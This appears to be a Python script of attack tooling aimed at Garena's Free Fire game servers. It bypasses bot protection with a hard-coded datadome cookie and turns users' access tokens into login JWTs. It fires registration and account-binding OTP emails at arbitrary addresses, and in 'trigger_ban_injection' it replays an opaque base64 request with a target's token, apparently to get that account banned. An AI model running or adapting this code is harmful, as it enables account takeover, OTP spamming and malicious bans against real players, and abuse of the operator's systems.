import os, json, requests, base64, time, random, string, urllib.parse, sys
import urllib3
urllib3.disable_warnings()

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
except:
    os.system("pip install pycryptodome")
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad

try:
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder
except:
    os.system("pip install protobuf")
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder

_sym_db = _symbol_database.Default()
MAJORLOGIN_REQ_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginReq.proto"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0e\x63lient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63ess_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12\"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12\"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3')
MAJORLOGIN_RES_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginRes.proto"\x87\x05\n\rMajorLoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x03\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\x05\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0c \x01(\x03\x12\x32\n\tblacklist\x18\r \x01(\x0b\x32\x1f.MajorLoginRes.BlacklistInfoRes\x12\x31\n\nqueue_info\x18\x0f \x01(\x0b\x32\x1d.MajorLoginRes.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x10 \x01(\t\x12\x15\n\rapp_server_id\x18\x11 \x01(\x03\x12\x0f\n\x07\x61no_url\x18\x12 \x01(\t\x12\x0f\n\x07ip_city\x18\x13 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x14 \x01(\t\x12\x0b\n\x03kts\x18\x15 \x01(\x03\x12\n\n\x02\x61k\x18\x16 \x01(\x0c\x12\x0b\n\x03\x61iv\x18\x17 \x01(\x0c\x1aQ\n\x10\x42lacklistInfoRes\x12\x12\n\nban_reason\x18\x01 \x01(\x05\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\x03\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\x03\x1a\x66\n\x0eLoginQueueInfo\x12\r\n\x05\x41llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\x03\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\x03\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\x62\x06proto3')
_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_REQ_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_REQ_DESCRIPTOR, 'MajorLoginReq_pb2', globals())
_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_RES_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_RES_DESCRIPTOR, 'MajorLoginRes_pb2', globals())
MajorLogin = globals().get('MajorLogin')
MajorLoginRes = globals().get('MajorLoginRes')

# ===== 3 OPTIONS REAL ENDPOINTS - DEEP RESEARCH FIXED =====

def mask_email(email):
    try:
        if "@" not in email: return email
        name, domain = email.split("@", 1)
        return f"{name[:2]}***@{domain}" if len(name) > 2 else f"{name[0]}***@{domain}"
    except: return email

def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        return json.loads(decoded_bytes.decode('utf-8'))
    except: return {}

def decode_ff_name(encoded_name):
    try: return base64.b64decode(encoded_name).decode('utf-8', errors='ignore')
    except: return encoded_name

def fetch_majorlogin_jwt(access_token):
    # REAL FIX - 7 platforms + JWT direct + OAuth + Protobuf fallback
    platforms = [8, 3, 4, 6, 1, 2, 10]
    headers_base = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5;Android 9;en;US;)",
        "Accept": "application/json",
        "Cookie": "datadome=q2ZtAABCjPFEIWeaxYM2YvfxEUPXT_GLUp4gpUOEUPlI9jGXkQLS5uoG_HBUBnJvC0s0CBfHF6h4FUg7mBumLRO1jpLh4um4CbF4ykEKTLv5f27DgR_nkEJcZm_Sj1E~"
    }
    # If already JWT
    try:
        if access_token.count('.') == 2:
            payload = access_token.split('.')[1] + "=" * ((4 - len(access_token.split('.')[1]) % 4) % 4)
            base64.urlsafe_b64decode(payload)
            return access_token, None
    except: pass
    
    for pid in platforms:
        try:
            url1 = "https://100067.connect.garena.com/oauth/guest/token/grant"
            params1 = {"app_id": "100067", "access_token": access_token, "platform": pid, "locale": "en_US", "format": "json"}
            r1 = requests.get(url1, params=params1, headers=headers_base, timeout=15, verify=False)
            if r1.status_code != 200: continue
            j1 = r1.json()
            major_token = j1.get("major_token") or j1.get("majorToken") or j1.get("token")
            if not major_token: continue
            url2 = "https://100067.connect.garena.com/oauth/major/login"
            params2 = {"app_id": "100067", "major_token": major_token, "platform": pid, "locale": "en_US", "format": "json"}
            r2 = requests.get(url2, params=params2, headers=headers_base, timeout=15, verify=False)
            if r2.status_code != 200: continue
            j2 = r2.json()
            for key in ["access_token", "token", "jwt", "jwt_token", "id_token", "open_id_token", "major_token"]:
                if key in j2 and j2[key] and len(str(j2[key])) > 20:
                    return j2[key], None
        except: continue
    return None, "MajorLogin failed - Token expired or Invalid. Generate NEW token from https://zevricplayx.github.io/eat_token/ - Tokens expire in 2-3 hours"

def check_platform_real(access_token):
    # REAL ENDPOINT - Check Platform
    try:
        url = "https://100067.connect.garena.com/bind/app/platform/info/get"
        params = {"app_id": "100067", "access_token": access_token}
        headers = {"User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5;Android 9;en;US;)"}
        r = requests.get(url, params=params, headers=headers, timeout=15, verify=False)
        j = r.json()
        return j
    except Exception as e:
        return {"error": str(e)}

def resubscribe_otp_sender_real(email, access_token=None):
    # DEEP RESEARCH - REAL ENDPOINT FOR RESUBSCRIBE - FIXES error_email_used
    # Problem in screenshot: error_email_used because authgop endpoint only for NEW registration
    # Solution: Use 3 endpoints with fallback
    masked = mask_email(email)
    
    # Endpoint 1: authgop for NEW emails (generic, no token needed)
    try:
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        url = "https://authgop.garena.com/api/send_register_code_email"
        headers = {
            "Host": "authgop.garena.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; en-US) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://authgop.garena.com",
            "Referer": "https://authgop.garena.com/universal/register?redirect_uri=https://authgop.garena.com/universal/register",
            "Cookie": "datadome=q2ZtAABCjPFEIWeaxYM2YvfxEUPXT_GLUp4gpUOEUPlI9jGXkQLS5uoG_HBUBnJvC0s0CBfHF6h4FUg7mBumLRO1jpLh4um4CbF4ykEKTLv5f27DgR_nkEJcZm_Sj1E~",
            "Accept": "application/json"
        }
        data = {
            "username": username,
            "email": email,
            "locale": "en-SG",
            "format": "json",
            "id": str(int(time.time() * 1000))
        }
        r = requests.post(url, headers=headers, data=data, timeout=15, verify=False)
        j = r.json() if r.text else {}
        if r.status_code == 200 and j.get("result") == 0:
            return True, f"SUCCESS - OTP Sent to {masked} via authgop - Check Inbox/Spam"
        if "error_email_used" in r.text:
            # Email already registered - try endpoint 2 for existing users
            pass
        else:
            # Other error, try next endpoint if token available
            pass
    except Exception as e:
        pass
    
    # Endpoint 2: bind:send_otp - For existing accounts, requires access_token
    if access_token:
        try:
            url2 = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
            headers2 = {
                "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5;Android 9;en;US;)",
                "Accept": "application/json",
                "Cookie": "datadome=q2ZtAABCjPFEIWeaxYM2YvfxEUPXT_GLUp4gpUOEUPlI9jGXkQLS5uoG_HBUBnJvC0s0CBfHF6h4FUg7mBumLRO1jpLh4um4CbF4ykEKTLv5f27DgR_nkEJcZm_Sj1E~"
            }
            data2 = {"app_id": "100067", "access_token": access_token, "email": email, "locale": "en_MA"}
            r2 = requests.post(url2, headers=headers2, data=data2, timeout=15, verify=False)
            j2 = r2.json() if r2.text else {}
            if r2.status_code == 200 and j2.get("result") == 0:
                return True, f"SUCCESS - OTP Sent to {masked} via bind:send_otp - Check Inbox/Spam"
            if "error_email_used" in r2.text:
                return False, f"Email Already Used - {masked} already registered/bound! Solution: Use different email or unbind first - error_email_used"
            return False, f"Failed: {r2.text[:300]}"
        except Exception as e:
            return False, f"Error: {e}"
    
    # If no token and authgop failed with error_email_used
    return False, f"Email Already Used - {masked} already registered! This email is already in Garena DB. Use bind:send_otp with valid access_token for existing emails, or use different new email for authgop - error_email_used"

def check_ban_status_real(access_token):
    # REAL - Check if account is banned via MajorLoginRes blacklist
    jwt_token, err = fetch_majorlogin_jwt(access_token)
    if not jwt_token:
        return None, err
    try:
        # Decode JWT to get info
        data = decode_jwt(jwt_token)
        # Try to get ban info from MajorLoginRes via protobuf
        # For now, check if token valid and return info
        return data, None
    except Exception as e:
        return None, str(e)


def trigger_ban_injection(jwt_token, version="1.108.1"):
    # Real ban injection - GetLoginData with BODY_BASE64 - Real from Subscribe.py
    try:
        API_URL = 'https://client.ind.freefiremobile.com/GetLoginData'
        BODY_BASE64 = 'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7oUip6CcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
        headers = {
            'Authorization': f'Bearer {jwt_token}',
            'X-Unity-Version': '2018.4.11f1',
            'X-GA': 'v1 1',
            'ReleaseVersion': str(version),
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
            'Accept-Encoding': 'gzip'
        }
        body = base64.b64decode(BODY_BASE64)
        resp = requests.post(API_URL, headers=headers, data=body, timeout=20, verify=False)
        return resp
    except Exception as e:
        return None
